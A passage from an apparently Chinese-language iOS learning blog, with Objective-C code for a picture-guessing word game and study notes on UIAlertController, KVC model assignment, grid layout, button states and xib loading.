class="line">-(void)setupAnswerViewWithLength:(NSInteger)count&#123;</div><div class="line">    </div><div class="line">    CGFloat startX = (kScreenSize.width - count*kButtonWidth - (count-1)*kMargin)/2;</div><div class="line">    //添加本题的时候要清除上一题的Button,让数组中所有的元素都执行清除方法</div><div class="line">    [_answerView.subviews makeObjectsPerformSelector:@selector(removeFromSuperview)];</div><div class="line">    for(int i = 0;i &lt; count;i++)&#123;</div><div class="line">        CGFloat buttonX = i*kButtonWidth + i*kMargin + startX;</div><div class="line">        UIButton *button = [[UIButton alloc]initWithFrame:CGRectMake(buttonX, kMargin, kButtonWidth, kButtonWidth)];</div><div class="line">        [button setBackgroundImage:[UIImage imageNamed:@&quot;btn_answer&quot; ] forState:UIControlStateNormal];</div><div class="line">        [button setBackgroundImage:[UIImage imageNamed:@&quot;btn_answer_highlighted&quot; ] forState:UIControlStateHighlighted];</div><div class="line">        [button setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];</div><div class="line">        [button addTarget:self action:@selector(didClickAnswerButton:) forControlEvents:UIControlEventTouchUpInside];</div><div class="line">        [_answerView addSubview:button];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">-(IBAction)nextQuestion:(UIButton *)sender &#123;</div><div class="line">    _index++;</div><div class="line">    [self setupUI];</div><div class="line">    _nextButton.enabled = (_index != self.dataArray.count);</div><div class="line">     _optionView.userInteractionEnabled = YES;</div><div class="line">&#125;</div><div class="line"></div><div class="line">-(void)didClickOptionButton:(UIButton *)optionButton&#123;</div><div class="line">    //取出文字</div><div class="line">    NSString *title = optionButton.currentTitle;</div><div class="line">    //隐藏被点击按钮</div><div class="line">    optionButton.hidden = YES;</div><div class="line">    //将点击的按钮文字显示到答案区域</div><div class="line">    //obj --&gt;数组对象</div><div class="line">    //idx --&gt;下标</div><div class="line">    //stop --&gt;判断结束</div><div class="line">    [_answerView.subviews enumerateObjectsUsingBlock:^(__kindof UIView *_Nonnull obj,NSUInteger idx, BOOL *_Nonnull stop)&#123;</div><div class="line">        UIButton *answerButton = obj;</div><div class="line">        if(answerButton.currentTitle.length==0)&#123;</div><div class="line">            [answerButton setTitle:title forState:UIControlStateNormal];</div><div class="line">            *stop = YES;</div><div class="line">        &#125;</div><div class="line">    &#125;];</div><div class="line">    __block BOOL isComplete = YES;</div><div class="line">    [_answerView.subviews enumerateObjectsUsingBlock:^(__kindof UIView *_Nonnull obj,NSUInteger idx, BOOL *_Nonnull stop)&#123;</div><div class="line">        UIButton *answerButton = obj;</div><div class="line">        if(answerButton.currentTitle.length==0)&#123;</div><div class="line">            isComplete = NO;</div><div class="line">            *stop = YES;</div><div class="line">        &#125;</div><div class="line">    &#125;];</div><div class="line">    if (isComplete) &#123;</div><div class="line">        //用户不能再点击选项区域中的按钮</div><div class="line">        //userInteractionEnabled = NO,禁止任何用户交互，如果是父View设置了这个属性，那么他的子View也将不会接受用户交互</div><div class="line">        _optionView.userInteractionEnabled = NO;</div><div class="line">        //判断用户是否输入正确，取出用户的答案和标准答案做对比</div><div class="line">        //取出用户答案</div><div class="line">        NSMutableString *userAnswer = [NSMutableString string];</div><div class="line">        [_answerView.subviews enumerateObjectsUsingBlock:^(__kindof UIView *_Nonnull obj,NSUInteger idx, BOOL *_Nonnull stop)&#123;</div><div class="line">            UIButton *answerButton = obj;</div><div class="line">            [userAnswer appendString:answerButton.currentTitle];</div><div class="line">        &#125;];</div><div class="line">        //取出正确答案</div><div class="line">        GuessModel *guessModel = self.dataArray[_index-1];</div><div class="line">        NSString *rightAnswer = guessModel.answer;</div><div class="line">        NSInteger currentCoin = _coinButton.currentTitle.integerValue;</div><div class="line">        if ([userAnswer isEqualToString:rightAnswer])&#123;</div><div class="line">            //自动跳转下一题，增加一百金币</div><div class="line">            currentCoin += 100;</div><div class="line">            //防止最后一题回答正确后继续跳转下一题而导致报错</div><div class="line">            if(_index != self.dataArray.count)</div><div class="line">                [self performSelector:@selector(nextQuestion:) withObject:nil afterDelay:1];</div><div class="line">        &#125;else &#123;</div><div class="line">            //答案区域字体变红，减少500金币</div><div class="line">            currentCoin -= 500;</div><div class="line">            if(currentCoin &lt; 0)&#123;</div><div class="line">                UIAlertController *alertView = [UIAlertController alertControllerWithTitle:@&quot;温馨提示&quot; message:@&quot;亲，你的钱不够了&quot; preferredStyle:UIAlertControllerStyleAlert];</div><div class="line">                UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@&quot;取消&quot; style:UIAlertActionStyleCancel handler:nil];</div><div class="line">                UIAlertAction *sureAction = [UIAlertAction actionWithTitle:@&quot;确定&quot; style:UIAlertActionStyleDefault handler:nil];</div><div class="line">                [alertView addAction:cancelAction];</div><div class="line">                [alertView addAction:sureAction];</div><div class="line">                [self presentViewController:alertView animated:YES completion:nil];</div><div class="line">                return;</div><div class="line">            &#125;</div><div class="line">             [_answerView.subviews enumerateObjectsUsingBlock:^(__kindof UIView *_Nonnull obj,NSUInteger idx, BOOL *_Nonnull stop)&#123;</div><div class="line">                 UIButton *answerButton = obj;</div><div class="line">                 </div><div class="line">                 [answerButton setTitleColor:[UIColor redColor] forState:UIControlStateNormal];</div><div class="line">             &#125;];</div><div class="line">        &#125;</div><div class="line">        NSString *coinTitle = [NSString stringWithFormat: @&quot;%ld&quot;,currentCoin ];</div><div class="line">        [_coinButton setTitle:coinTitle forState:UIControlStateNormal];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">-(void)didClickAnswerButton:(UIButton *)answerButton&#123;</div><div class="line">    //如果没有文本就直接返回</div><div class="line">    if(answerButton.currentTitle.length == 0)&#123;</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">    //取出文本</div><div class="line">    NSString *title = answerButton.currentTitle;</div><div class="line">    //清空按钮区域的文本</div><div class="line">    [answerButton setTitle:@&quot;&quot; forState:UIControlStateNormal];</div><div class="line">    [_optionView.subviews enumerateObjectsUsingBlock:^(__kindof UIView *_Nonnull obj,NSUInteger idx, BOOL *_Nonnull stop)&#123;</div><div class="line">        UIButton *optionButton = obj;</div><div class="line">        //将选项中的相应文字显示出来</div><div class="line">        if([optionButton.currentTitle isEqualToString:title])&#123;</div><div class="line">            optionButton.hidden = NO;</div><div class="line">            *stop = YES;</div><div class="line">        &#125;</div><div class="line">    &#125;];</div><div class="line">    [_answerView.subviews enumerateObjectsUsingBlock:^(__kindof UIView *_Nonnull obj,NSUInteger idx, BOOL *_Nonnull stop)&#123;</div><div class="line">        UIButton *answerButton = obj;</div><div class="line">        </div><div class="line">        [answerButton setTitleColor:[UIColor redColor] forState:UIControlStateNormal];</div><div class="line">    &#125;];</div><div class="line">    //打开选项区域的用户交互</div><div class="line">    _optionView.userInteractionEnabled=YES;</div><div class="line">&#125;</div><div class="line"></div><div class="line">-(UIStatusBarStyle)preferredStatusBarStyle&#123;</div><div class="line">    //在黑色的背景下显示状态栏</div><div class="line">    return UIStatusBarStyleLightContent;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (IBAction)didClickTipButton:(UIButton *)sender &#123;</div><div class="line">    </div><div class="line">    NSInteger currentCoin = _coinButton.currentTitle.integerValue;</div><div class="line">    currentCoin -= 1000;</div><div class="line">    //做一个判断分数是否大于1000</div><div class="line">    if(currentCoin &lt; 0)&#123;</div><div class="line">        UIAlertController *alertView = [UIAlertController alertControllerWithTitle:@&quot;温馨提示&quot; message:@&quot;亲，你的钱不够了&quot; preferredStyle:UIAlertControllerStyleAlert];</div><div class="line">        UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@&quot;取消&quot; style:UIAlertActionStyleCancel handler:nil];</div><div class="line">        UIAlertAction *sureAction = [UIAlertAction actionWithTitle:@&quot;确定&quot; style:UIAlertActionStyleDefault handler:nil];</div><div class="line">        [alertView addAction:cancelAction];</div><div class="line">        [alertView addAction:sureAction];</div><div class="line">        [self presentViewController:alertView animated:YES completion:nil];</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">    NSString *coinstring = [NSString stringWithFormat:@&quot;%ld&quot;,currentCoin];</div><div class="line">    [_coinButton setTitle:coinstring forState:UIControlStateNormal];</div><div class="line">    GuessModel *guessModel = self.dataArray[_index-1];</div><div class="line">    NSString *rightAnswer = guessModel.answer;</div><div class="line">    NSString *firststring = [rightAnswer substringToIndex:1];</div><div class="line">    [_answerView.subviews enumerateObjectsUsingBlock:^(__kindof UIView *_Nonnull obj,NSUInteger idx, BOOL *_Nonnull stop)&#123;</div><div class="line">        UIButton *answerButton = obj;</div><div class="line">        if(idx == 0)&#123;</div><div class="line">            [answerButton setTitle:firststring forState:UIControlStateNormal];</div><div class="line">        &#125;else &#123;</div><div class="line">            //如果不是第一个字符串，则清空</div><div class="line">            [answerButton setTitle:@&quot;&quot; forState:UIControlStateNormal];</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;];</div><div class="line">    [_optionView.subviews enumerateObjectsUsingBlock:^(__kindof UIView *_Nonnull obj,NSUInteger idx, BOOL *_Nonnull stop)&#123;</div><div class="line">        UIButton *optionButton = obj;</div><div class="line">        if([optionButton.currentTitle isEqualToString:firststring])&#123;</div><div class="line">            //如果字符串相等，就把button隐藏</div><div class="line">            optionButton.hidden = YES;</div><div class="line">        &#125;else&#123;</div><div class="line">            //如果不是第一个就要回到原位</div><div class="line">            optionButton.hidden = NO;</div><div class="line">        &#125;</div><div class="line">    &#125;];</div><div class="line">    [_answerView.subviews enumerateObjectsUsingBlock:^(__kindof UIView *_Nonnull obj,NSUInteger idx, BOOL *_Nonnull stop)&#123;</div><div class="line">        UIButton *answerButton = obj;</div><div class="line">        </div><div class="line">        [answerButton setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];</div><div class="line">    &#125;];</div><div class="line">    _optionView.userInteractionEnabled = YES;</div><div class="line">&#125;</div><div class="line">- (IBAction)didClickimageButton:(UIButton *)sender &#123;</div><div class="line">    [UIView animateWithDuration:0.5 animations:^&#123;</div><div class="line">         _coverView.alpha = 0.6;</div><div class="line">        //将图片放大至原来的1.5倍</div><div class="line">        _imageButton.transform = CGAffineTransformMakeScale(1.5, 1.5);</div><div class="line">    &#125;];</div><div class="line">    [self.view addSubview:_coverView];</div><div class="line">    //将图片按钮放在coverView的上面</div><div class="line">    [self.view bringSubviewToFront:_imageButton];</div><div class="line">&#125;</div><div class="line">- (IBAction)didClickBigImageButton:(id)sender &#123;</div><div class="line">        //通过coverView的alpha值作判断</div><div class="line">        if(_coverView.alpha == 0)</div><div class="line">        &#123;</div><div class="line">            [self didClickimageButton:nil];</div><div class="line">        &#125;else &#123;</div><div class="line">            [UIView animateWithDuration:0.5 animations:^&#123;</div><div class="line">        //将透明度和图片的大小复原</div><div class="line">                _coverView.alpha = 0;</div><div class="line">                //CGAffineTransformIdentity如果赋值回去，那么之前通过transform改变的属性都会复原</div><div class="line">                _imageButton.transform = CGAffineTransformIdentity;</div><div class="line">            &#125;];</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">- (IBAction)didClickHelp:(id)sender &#123;</div><div class="line">    UIAlertController *alertView = [UIAlertController alertControllerWithTitle:@&quot;亲爱的玩家&quot; message:@&quot;你需要我们的帮助吗？&quot; preferredStyle:UIAlertControllerStyleAlert];</div><div class="line">    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@&quot;取消&quot; style:UIAlertActionStyleCancel handler:nil];</div><div class="line">    UIAlertAction *sureAction = [UIAlertAction actionWithTitle:@&quot;确定&quot; style:UIAlertActionStyleDefault handler:^(UIAlertAction *_Nonnull action)&#123;</div><div class="line">        UIAlertController *alertView = [UIAlertController alertControllerWithTitle:@&quot;通道入口&quot; message:@&quot;请问你是哪种类型的玩家呢？&quot; preferredStyle:UIAlertControllerStyleActionSheet];</div><div class="line">        UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@&quot;非RMB&quot; style:UIAlertActionStyleCancel handler:^(UIAlertAction *_Nonnull action)&#123;</div><div class="line">            UIAlertController *alertView = [UIAlertController alertControllerWithTitle:@&quot;智障！！！&quot; message:@&quot;没钱玩个毛，滚犊子！&quot; preferredStyle:UIAlertControllerStyleAlert];</div><div class="line">            UIAlertAction *sureAction = [UIAlertAction actionWithTitle:@&quot;我这就滚～&quot; style:UIAlertActionStyleDefault handler:nil];</div><div class="line">            [alertView addAction:sureAction];</div><div class="line">             [self presentViewController:alertView animated:YES completion:nil];</div><div class="line">        &#125;];</div><div class="line">        UIAlertAction *sureAction = [UIAlertAction actionWithTitle:@&quot;RMB&quot; style:UIAlertActionStyleDefault handler:^(UIAlertAction *_Nonnull action)&#123;</div><div class="line">            UIAlertController *alertView = [UIAlertController alertControllerWithTitle:@&quot;尊敬的玩家&quot; message:@&quot;我的支付宝账号是15629085780，我们加个好友慢慢聊&quot; preferredStyle:UIAlertControllerStyleAlert];</div><div class="line">            UIAlertAction *sureAction = [UIAlertAction actionWithTitle:@&quot;我马上加&quot; style:UIAlertActionStyleDefault handler:nil];</div><div class="line">            [alertView addAction:sureAction];</div><div class="line">            [self presentViewController:alertView animated:YES completion:nil];</div><div class="line">        &#125;];</div><div class="line">        [alertView addAction:cancelAction];</div><div class="line">        [alertView addAction:sureAction];</div><div class="line">        [self presentViewController:alertView animated:YES completion:nil];</div><div class="line">    &#125;];</div><div class="line">    [alertView addAction:cancelAction];</div><div class="line">    [alertView addAction:sureAction];</div><div class="line">    [self presentViewController:alertView animated:YES completion:nil];</div><div class="line">&#125;</div><div class="line">- (IBAction)kaigua:(id)sender &#123;</div><div class="line">    if ([self.gua.text isEqualToString:@&quot;Kana&quot;]) &#123;</div><div class="line">         UIAlertController *alertView = [UIAlertController alertControllerWithTitle:@&quot;特殊的玩家&quot; message:@&quot;题目的答案问问你旁边的人就知道了哟&quot; preferredStyle:UIAlertControllerStyleAlert];</div><div class="line">        UIAlertAction *sureAction = [UIAlertAction actionWithTitle:@&quot;这真是个好主意&quot; style:UIAlertActionStyleDefault handler:nil];</div><div class="line">        [alertView addAction:sureAction];</div><div class="line">        [self presentViewController:alertView animated:YES completion:nil];</div><div class="line">    &#125;else if ([self.gua.text isEqualToString:@&quot;潘振鹏&quot;])&#123;</div><div class="line">        NSInteger currentCoin = _coinButton.currentTitle.integerValue;</div><div class="line">        currentCoin += 10000;</div><div class="line">        NSString *coinString = [NSString stringWithFormat:@&quot;%ld&quot;, currentCoin];</div><div class="line">        [_coinButton setTitle:coinString forState:UIControlStateNormal];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">//猜测字谜的答案部分，字典转模型</div><div class="line">//  GuessModel.m</div><div class="line">#import &quot;GuessModel.h&quot;</div><div class="line"></div><div class="line">@implementation GuessModel</div><div class="line">-(instancetype)initWithDict:(NSDictionary *)dict&#123;</div><div class="line">    if (self = [super init]) &#123;</div><div class="line">        [self setValuesForKeysWithDictionary:dict];</div><div class="line">    &#125;</div><div class="line">    return self;</div><div class="line">&#125;</div><div class="line">+(instancetype)guessModelDict:(NSDictionary *)dict&#123;</div><div class="line">    return [[self alloc]initWithDict:dict];</div><div class="line">&#125;</div><div class="line">@end</div><div class="line">//  GuessModel.h</div><div class="line">#import &lt;Foundation/Foundation.h&gt;</div><div class="line"></div><div class="line">@interface GuessModel : NSObject</div><div class="line">@property (nonatomic, copy)NSString *answer;</div><div class="line">@property (nonatomic, copy)NSString *icon;</div><div class="line">@property (nonatomic, copy)NSString *title;</div><div class="line">@property (nonatomic, copy)NSArray *options;</div><div class="line"></div><div class="line">-(instancetype)initWithDict:(NSDictionary *)dict;</div><div class="line">+(instancetype)guessModelDict:(NSDictionary *)dict;</div><div class="line">@end</div></pre></td></tr></table></figure>
<h2 id="10-UIAlertController提示框"><a href="#10-UIAlertController提示框" class="headerlink" title="10.UIAlertController提示框"></a>10.UIAlertController提示框</h2><p>两种提示的方式：</p>
<p>1.中部弹出：style为UIAlertControllerStyleAlert</p>
<p>2.底部弹出：style为UIAlertControllerStyleActionSheet</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//创建点击的选项并加入提示框</div><div class="line">UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@&quot;取消&quot; style:UIAlertActionStyleCancel handler:nil];</div><div class="line">        UIAlertAction *sureAction = [UIAlertAction actionWithTitle:@&quot;确定&quot; style:UIAlertActionStyleDefault handler:nil];</div><div class="line">        [alertView addAction:cancelAction];</div><div class="line">        [alertView addAction:sureAction];</div><div class="line">//在handler中可以进行回调，nil则没有触发事件</div></pre></td></tr></table></figure>
<h2 id="11-KVC模型"><a href="#11-KVC模型" class="headerlink" title="11.KVC模型"></a>11.KVC模型</h2><p>使用kvc进行快速赋值<a href="http://www.jianshu.com/p/870eb4b4170a" target="_blank" rel="external">字典快速赋值</a>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">test.name=dic[@&quot;name&quot;];</div><div class="line">test.sex=dic[@&quot;sex&quot;];</div><div class="line">test.age=dic[@&quot;age&quot;];</div><div class="line">//将赋值的过程替换为一句话</div><div class="line">[test setValuesForKeysWithDictionary:dic];</div><div class="line">//如果model中有不存在于dict中的元素</div><div class="line">@property (nonatomic,copy)NSString *other;</div><div class="line">//此时如果打印一下other的值，可以看到他的值为null，显而易见,dic中的值可以完全赋值给model，而other没有被赋值，所以值是空的</div><div class="line">NSLog(@&quot;test.other=%@&quot;,test.other);</div><div class="line">test.other=(null)</div><div class="line">//如果dict中有不存在于Model中的元素</div><div class="line">Terminating app due to uncaught exception &apos;NSUnknownKeyException&apos;,</div><div class="line">reason: &apos;[&lt;PersonModel 0x7fd731517910&gt; setValue:forUndefinedKey:]:</div><div class="line">this class is not key value coding-compliant for the key age.&apos;</div><div class="line">//通过了编译，但是运行时报错,解决方式就是实现一个方法setValue:forUndefinedKey: 这个方法能过滤掉不存在的键值。在model.h／m文件中添加</div><div class="line">-(void)setValue:(id)value forUndefinedKey:(NSString *)key;</div><div class="line">-(void)setValue:(id)value forUndefinedKey:(NSString *)key&#123;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">//在.m文件中不需要写任何的内容，现在就可以成功运行了</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> KVC字典快速赋值 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS-UI学习(二)]]></title>
      <url>/2017/05/12/iOS-UI%E5%AD%A6%E4%B9%A0-%E4%BA%8C/</url>
      <content type="html"><![CDATA[<p>UI初步（二）<br><a id="more"></a></p>
<h1 id="UI基础Day3"><a href="#UI基础Day3" class="headerlink" title="UI基础Day3"></a>UI基础Day3</h1><h2 id="1-代码生成多个图片的方法（多重循环）"><a href="#1-代码生成多个图片的方法（多重循环）" class="headerlink" title="1.代码生成多个图片的方法（多重循环）"></a>1.代码生成多个图片的方法（多重循环）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    CGFloat Width = 50;</div><div class="line">    CGFloat Height = 25;</div><div class="line">    CGFloat margin = (CGRectGetMaxX(self.view.frame)-5*Width)/6;</div><div class="line">    for (int i = 0; i &lt; 15; i++) &#123;</div><div class="line">        NSInteger x = i/5;</div><div class="line">        NSInteger y = i%5;</div><div class="line">        CGFloat viewx = (y+1)*margin + y*Width;</div><div class="line">        CGFloat viewy = (x+1)*margin + x*Height;</div><div class="line">        UIView *imageview = [[UIView alloc] initWithFrame:CGRectMake(viewx, viewy, Width, Height)];</div><div class="line">        imageview.tag = i;</div><div class="line">        [imageview setBackgroundColor:[UIColor blueColor]];</div><div class="line">        [self.view addSubview:imageview];</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="2-在View中嵌套图片和文字-以下代码均写在for循环中"><a href="#2-在View中嵌套图片和文字-以下代码均写在for循环中" class="headerlink" title="2.在View中嵌套图片和文字,以下代码均写在for循环中"></a>2.在View中嵌套图片和文字,以下代码均写在for循环中</h2><figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/154562D5-9767-486C-98B2-F24030E30966.png" alt="" title="" class="">
                <p></p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">nameLabel.text = @&quot;xxxx&quot;;</div><div class="line">//设置文本内容</div><div class="line">nameLabel.textAlignment = NSTextAlignmentCenter;</div><div class="line">//设置对齐的模式</div><div class="line">nameLabel.font = [UIFont boldSystemFontOfSize:15];</div><div class="line">//设置字体</div><div class="line">/*</div><div class="line">boldSystemFontOfSize  :   加粗体</div><div class="line">systemFontOfSize      :   默认体</div><div class="line">italicSystemFontOfSize:   斜体</div><div class="line">*/</div></pre></td></tr></table></figure>
<h2 id="3-button属性（在按钮up的时候button的highlighted状态会被clear）"><a href="#3-button属性（在按钮up的时候button的highlighted状态会被clear）" class="headerlink" title="3.button属性（在按钮up的时候button的highlighted状态会被clear）"></a>3.button属性（在按钮up的时候button的highlighted状态会被clear）</h2><p>设置background image ,image,title要分状态设置</p>
<blockquote>
<p>默认</p>
<p>高亮 —&gt; 按钮被点击的时候，自动切换成高亮状态</p>
<p>被选中—&gt;设置button的selected 属性为Yes</p>
<p>被禁用—&gt;设置button的enabled 属性为NO 不可用</p>
</blockquote>
<p>如果想点击之后一直保持在高亮状态的话，需要进行属性的设置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">- (void)highlightButton:(UIButton *)b &#123;   </div><div class="line">    [b setHighlighted:YES];  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"> - (IBAction)onTouchup:(UIButton *)sender &#123;  </div><div class="line">    [self performSelector:@selector(highlightButton:) withObject:sender afterDelay:0.0];  </div><div class="line">&#125;  </div><div class="line">//最后将按钮和方法连线</div></pre></td></tr></table></figure>
<h2 id="4-不可变数组和可变数组"><a href="#4-不可变数组和可变数组" class="headerlink" title="4.不可变数组和可变数组"></a>4.不可变数组和可变数组</h2><p>1.不可变数组：内部元素不可修改，防止被不正当修改</p>
<p>2.可变数组：相对而言，更消耗性能</p>
<h2 id="5-注意，如果想使用懒加载加载数据的话，必须要用self-重写的getter方法，不然直接访问的是这个对象，而不是通过getter方法。"><a href="#5-注意，如果想使用懒加载加载数据的话，必须要用self-重写的getter方法，不然直接访问的是这个对象，而不是通过getter方法。" class="headerlink" title="5.注意，如果想使用懒加载加载数据的话，必须要用self.重写的getter方法，不然直接访问的是这个对象，而不是通过getter方法。"></a>5.注意，如果想使用懒加载加载数据的话，必须要用self.重写的getter方法，不然直接访问的是这个对象，而不是通过getter方法。</h2><h2 id="6-可以通过plist文件来优化"><a href="#6-可以通过plist文件来优化" class="headerlink" title="6.可以通过plist文件来优化"></a>6.可以通过plist文件来优化</h2><p>当需要遍历多个内部某些属性不同的模块时，可以通过在plist数组或字典来实现，只需要在代码中读取plist文件中的内容即可。</p>
<h2 id="7-循环时算法的优化"><a href="#7-循环时算法的优化" class="headerlink" title="7.循环时算法的优化"></a>7.循环时算法的优化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for(int i = 0;i &lt; self.dataArray.count;i++)&#123;</div><div class="line">  //其中行索引和列索引分别由（i/列数）和（i%列数）来替代</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/5E87432E-75AB-4A46-95F2-EBEA63384130.png" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="8-字典转模型"><a href="#8-字典转模型" class="headerlink" title="8.字典转模型"></a>8.字典转模型</h2><figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/0B00C653-FEFA-49C9-96C5-0EBC9FC5E82A.png" alt="示例图" title="" class="">
                <p>示例图</p>
            </figure>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/688A2E58-81CA-4887-9BC8-F67579FCF3B7.png" alt="" title="" class="">
                <p></p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">//Appmodel.h中的代码</div><div class="line">@property(nonatomic, copy)NSString *name;</div><div class="line">@property(nonatomic, copy)NSString *icon;</div><div class="line">-(instancetype)initWithDict:(NSDictionary *)dict;</div><div class="line">+(instancetype)appModelWithDict:(NSDictionary *)dict;</div><div class="line">//Appmodel.m中的代码</div><div class="line">-(instancetype)initWithDict:(NSDictionary *)dict&#123;</div><div class="line">  if(self = [super init])&#123;</div><div class="line">    self.name = dict[@&quot;name&quot;];</div><div class="line">    self.icon = dict[@&quot;icon&quot;];</div><div class="line">  &#125;</div><div class="line">  return self;</div><div class="line">&#125;</div><div class="line">+(instancetype)appModelWithDict:(NSDictionary *)dict&#123;</div><div class="line">  return [[self alloc] initWithDict:dict];</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">/*</div><div class="line">注意在写接口的时候，</div><div class="line">创建实例方法的同时也要创建一个类方法，</div><div class="line">是一个约定俗成的规矩,</div><div class="line">同时在写类方法的时候也要考虑到之后继承和多态的问题。</div><div class="line">同时，self在哪个类里就表示这个类自身，</div><div class="line">谁调用的方法，这个self就表示谁。</div><div class="line">图片中的代码也可以优化一下了</div><div class="line">*／</div></pre></td></tr></table></figure>
<h2 id="9-id和instancetype的区别"><a href="#9-id和instancetype的区别" class="headerlink" title="9.id和instancetype的区别"></a>9.id和instancetype的区别</h2><p>1.id和instancetype都可以作为返回值</p>
<p>2.instancetype不可以作为参数类型，但是它可以检测返回类型。</p>
<p>3.在ARC(Auto Reference Count)环境下:instancetype用来在编译期确定实例的类型,而使用id的话,编译器不检查类型, 运行时检查类型.</p>
<p>4.在MRC(Manual Reference Count)环境下:instancetype和id一样,不做具体类型检查</p>
<h2 id="10-xib的使用"><a href="#10-xib的使用" class="headerlink" title="10.xib的使用"></a>10.xib的使用</h2><p>1.在添加新文件中找到View旁边的Empty添加进项目目录中。</p>
<p>2.在项目文件中xib文件是以.xib结尾，安装之后，就自动变成了以.nib</p>
<p>3.可以在xib中布置你想要的Label,Button，再加载进函数中，可以缩减代码部分。</p>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/7873B694-004F-4A7D-A163-645AED229C02.png" alt="" title="" class="">
                <p></p>
            </figure>
<p>4.xib是一个空的view,加载xib的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UIView *yellowview = [[[NSBundle mainBundle] loadNibNamed:@&quot;xib的文件名&quot; owner:nil options:nil] lastObject];</div></pre></td></tr></table></figure>
<p>frame: 是以父控件的左上角为坐标原点</p>
<p>bounds:是以自身的左上角为坐标原点</p>
<h2 id="11-xib和class关联以及简单mvc"><a href="#11-xib和class关联以及简单mvc" class="headerlink" title="11.xib和class关联以及简单mvc"></a>11.xib和class关联以及简单mvc</h2><p>1.xib里的文件也可以通过连线的方式来和控制器关联，可以重新创建一个xx.m的控制器，将其中的class改为xib文件的名字即可，这样就可以将其模块化，避免主控制器中代码过于繁杂。</p>
<p>2.如果涉及到代码和逻辑操作的时候，把xib和一个class进行关联</p>
